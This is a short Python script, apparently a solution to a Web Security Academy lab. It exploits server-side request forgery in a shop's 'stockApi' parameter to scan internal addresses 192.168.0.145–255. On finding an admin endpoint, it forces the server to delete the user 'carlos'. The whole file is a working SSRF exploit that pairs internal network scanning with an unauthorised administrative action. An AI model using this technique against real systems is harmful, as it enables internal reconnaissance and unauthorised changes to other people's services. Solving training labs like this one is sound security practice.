import requests
import json
import bs4
import time
url = "https://0a7a00de04c9485b8949a6a000850094.web-security-academy.net/product/stock"
x = 0
for x in range (145,256):
        data = {
            "stockApi": f"http://192.168.0.{x}:8080/product/stock/check?productId=2&storeId=1"
        }
        print(x)
        try:
            response = requests.request("POST", url, data=data)
            print(response.status_code)
            if response.status_code != 500 and response.status_code != 501 and response.status_code != 502 and response.status_code != 503 and response.status_code != 504 and response.status_code != 505 and response.status_code != 506 and response.status_code != 507 and response.status_code != 404 :
                print(response.text)
                print(response.status_code)
                break
            elif response.status_code == 404:
                print("Find")
                data["stockApi"] =f"http://192.168.0.{x}:8080/delete?username=carlos"
                response = requests.request("POST", url, data=data)
                print(response.text)
                break

            else:
                pass
        except requests.exceptions.RequestException as e:
            print("ERROR:", e)
            time.sleep(1)